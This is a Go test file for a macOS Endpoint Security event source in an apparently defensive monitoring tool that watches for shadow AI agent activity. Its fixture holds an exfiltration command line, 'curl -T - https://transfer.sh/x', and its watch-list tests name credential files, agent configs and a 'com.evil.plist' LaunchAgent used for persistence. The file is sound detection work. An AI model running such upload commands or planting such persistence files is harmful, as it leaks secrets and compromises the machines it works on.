// Copyright 2026 Cisco Systems, Inc. and its affiliates
// Copyright (c) 2026 Mike Storm. All rights reserved.
//
// Derived from ShadowClaw -- Universal Shadow AI Detector, by Mike Storm,
// Distinguished Engineer, CCIE Security 13847. Reimplemented in Go and
// absorbed into the DefenseClaw gateway; see NOTICE for the modifications.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

//go:build darwin

package plane

import (
	"strings"
	"testing"
)

// esExecMessage is a representative eslogger exec record, trimmed to the
// members this source reads. Decoding is tested against the real wire shape
// rather than a mock, because the shape is what a macOS release can change.
const esExecMessage = `{
  "event_type": 9,
  "time": "2026-09-09T22:15:04.123456789Z",
  "process": {
    "audit_token": {"pid": 4242, "euid": 501},
    "ppid": 4200,
    "responsible_audit_token": {"pid": 4100, "euid": 501},
    "executable": {"path": "/bin/sh"}
  },
  "event": {
    "exec": {
      "target": {
        "audit_token": {"pid": 4300, "euid": 501},
        "ppid": 4242,
        "responsible_audit_token": {"pid": 4100, "euid": 501},
        "executable": {"path": "/usr/bin/curl"}
      },
      "args": ["curl", "-T", "-", "https://transfer.sh/x"]
    }
  }
}`

func testSource() *darwinSource {
	return &darwinSource{buffer: NewBuffer(), watched: watchedPrefixes([]string{"/Users/dev"})}
}

func TestDarwinDecodesExecWithLineageAndArgv(t *testing.T) {
	t.Parallel()
	var message esMessage
	if err := decodeJSON(t, esExecMessage, &message); err != nil {
		t.Fatalf("decode: %v", err)
	}
	event, ok := testSource().translate(message)
	if !ok {
		t.Fatal("an exec message did not translate")
	}
	if event.Kind != KindExec {
		t.Errorf("Kind = %s, want %s", event.Kind, KindExec)
	}
	// The exec'd process is the target, not the process that called exec.
	if event.PID != 4300 {
		t.Errorf("PID = %d, want the exec target 4300", event.PID)
	}
	if event.PPID != 4242 {
		t.Errorf("PPID = %d, want the calling process 4242", event.PPID)
	}
	// Responsible pid is what survives reparenting on macOS, and is what makes
	// an agent -> sh -> curl chain attributable after the shell exits.
	if event.ResponsiblePID != 4100 {
		t.Errorf("ResponsiblePID = %d, want 4100", event.ResponsiblePID)
	}
	if event.Name != "curl" {
		t.Errorf("Name = %q, want %q", event.Name, "curl")
	}
	if event.Cmdline != "curl -T - https://transfer.sh/x" {
		t.Errorf("Cmdline = %q", event.Cmdline)
	}
	if event.At.IsZero() {
		t.Error("At was not decoded")
	}
}

// TestDarwinFiltersFileEventsToWatchedPaths pins the reason the filter exists:
// Endpoint Security delivers every open() on the system, which on a developer
// machine is tens of thousands a second.
func TestDarwinFiltersFileEventsToWatchedPaths(t *testing.T) {
	t.Parallel()
	source := testSource()
	for _, test := range []struct {
		name string
		path string
		want bool
	}{
		{"a credential file", "/Users/dev/.aws/credentials", true},
		{"an agent config", "/Users/dev/.claude/settings.json", true},
		{"a launch agent", "/Users/dev/Library/LaunchAgents/x.plist", true},
		{"a system launch daemon", "/Library/LaunchDaemons/x.plist", true},
		{"an ordinary source file", "/Users/dev/project/main.go", false},
		{"a build artifact", "/Users/dev/project/build/out", false},
		{"an empty path", "", false},
	} {
		t.Run(test.name, func(t *testing.T) {
			message := esMessage{
				EventType: esEventTypeNotifyOpen,
				Process:   esProcess{AuditToken: esAuditToken{PID: 9}, Executable: esFile{Path: "/bin/cat"}},
				Event:     rawJSON(t, map[string]any{"open": map[string]any{"file": map[string]any{"path": test.path}}}),
			}
			event, ok := source.translate(message)
			if ok != test.want {
				t.Fatalf("translate(%q) delivered = %t, want %t", test.path, ok, test.want)
			}
			if ok && event.Path != test.path {
				t.Fatalf("Path = %q, want %q", event.Path, test.path)
			}
		})
	}
}

func TestDarwinTranslatesCreateAndRenameAsWrites(t *testing.T) {
	t.Parallel()
	source := testSource()

	created := esMessage{
		EventType: esEventTypeNotifyCreate,
		Process:   esProcess{AuditToken: esAuditToken{PID: 11}, Executable: esFile{Path: "/bin/sh"}},
		Event: rawJSON(t, map[string]any{"create": map[string]any{"destination": map[string]any{
			"new_path": map[string]any{
				"dir":      map[string]any{"path": "/Users/dev/Library/LaunchAgents"},
				"filename": "com.evil.plist",
			},
		}}}),
	}
	event, ok := source.translate(created)
	if !ok || event.Kind != KindFileWrite {
		t.Fatalf("create translated to %+v, ok=%t", event, ok)
	}
	if event.Path != "/Users/dev/Library/LaunchAgents/com.evil.plist" {
		t.Fatalf("Path = %q, want the joined new_path", event.Path)
	}

	renamed := esMessage{
		EventType: esEventTypeNotifyRename,
		Process:   esProcess{AuditToken: esAuditToken{PID: 12}, Executable: esFile{Path: "/bin/mv"}},
		Event: rawJSON(t, map[string]any{"rename": map[string]any{
			"source": map[string]any{"path": "/Users/dev/.claude/settings.json"},
		}}),
	}
	event, ok = source.translate(renamed)
	if !ok || event.Kind != KindFileWrite {
		t.Fatalf("rename translated to %+v, ok=%t", event, ok)
	}
}

// TestDarwinSkipsUnknownEventTypes pins that a macOS release delivering an
// event this build does not know does not stop the stream.
func TestDarwinSkipsUnknownEventTypes(t *testing.T) {
	t.Parallel()
	_, ok := testSource().translate(esMessage{EventType: 9999})
	if ok {
		t.Fatal("an unknown event type was translated")
	}
}

// TestDarwinRefusesToStartUnprivileged pins the honest failure: Endpoint
// Security refuses an unprivileged client outright, and saying so beats
// letting the subprocess fail with an error nobody would connect to a
// checkbox.
func TestDarwinRefusesToStartUnprivileged(t *testing.T) {
	t.Parallel()
	if isRoot() {
		t.Skip("running as root; the unprivileged refusal cannot be observed")
	}
	err := NewSource([]string{"/Users/dev"}).Start(t.Context())
	if err == nil {
		t.Fatal("an unprivileged Start() succeeded")
	}
	if !strings.Contains(err.Error(), "needs root") {
		t.Fatalf("error = %v, want it to name the privilege requirement", err)
	}
}

func TestParseESTimeFallsBackToNow(t *testing.T) {
	t.Parallel()
	if parseESTime("2026-09-09T22:15:04.123456789Z").IsZero() {
		t.Error("a valid RFC3339 time did not parse")
	}
	if parseESTime("not a time").IsZero() {
		t.Error("an unparseable time should fall back to now, not the zero time")
	}
	if parseESTime("").IsZero() {
		t.Error("an empty time should fall back to now")
	}
}
